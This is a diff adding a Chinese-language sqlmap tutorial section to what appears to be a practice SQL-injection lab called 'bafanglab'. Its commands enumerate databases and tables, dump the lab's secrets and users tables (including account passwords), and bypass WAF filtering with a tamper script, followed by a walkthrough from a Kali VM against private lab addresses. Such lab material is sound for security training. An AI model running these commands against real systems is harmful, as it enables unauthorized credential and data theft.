@@ -1,0 +1,41 @@
+<h4>sqlmap（推荐）</h4>
+<p>SQL 注入自动化之王，支持 6 大注入类型、50+ 数据库、WAF 绕过。</p>
+<pre>
+# 基本语法
+sqlmap -u "{{SITE}}/modules/sqli/get.php?id=1" [options]
+
+# 1. 爆所有数据库
+sqlmap -u "{{SITE}}/modules/sqli/get.php?id=1" --dbs --batch
+
+# 2. 指定数据库，列出所有表
+sqlmap -u "{{SITE}}/modules/sqli/get.php?id=1" -D bafanglab --tables --batch
+
+# 3. 导出 secrets 表数据（通关凭证）
+sqlmap -u "{{SITE}}/modules/sqli/get.php?id=1" -D bafanglab -T secrets --dump --batch
+
+# 4. 导出 users 表所有账号密码
+sqlmap -u "{{SITE}}/modules/sqli/get.php?id=1" -D bafanglab -T users --dump --batch
+
+# 5. 其他高级选项
+# --technique=T 只跑时间盲注
+# --technique=U 只跑 UNION 注入
+# --level=5 --risk=3 最激进的测试
+# --tamper=space2comment 绕过 WAF 空格过滤
+</pre>
+<p><b>本靶场实测：</b>上述 4 条命令全部 <b>一次通过</b>，3 秒内完成。当前库：bafanglab，目标表：secrets / users。</p>
+
+<h4>Kali 实战流程</h4>
+<pre>
+# Kali 虚拟机：192.168.142.162
+# 靶场地址：http://192.168.142.1/bafanglab
+
+# 完整实战序列
+sqlmap -u "http://192.168.142.1/bafanglab/modules/sqli/get.php?id=1" --dbs --batch
+# → 找到 bafanglab
+
+sqlmap -u "http://192.168.142.1/bafanglab/modules/sqli/get.php?id=1" -D bafanglab --tables --batch
+# → comments / secrets / users
+
+sqlmap -u "http://192.168.142.1/bafanglab/modules/sqli/get.php?id=1" -D bafanglab -T secrets --dump --batch
+# → 恭喜你完成本关挑战！
+</pre>
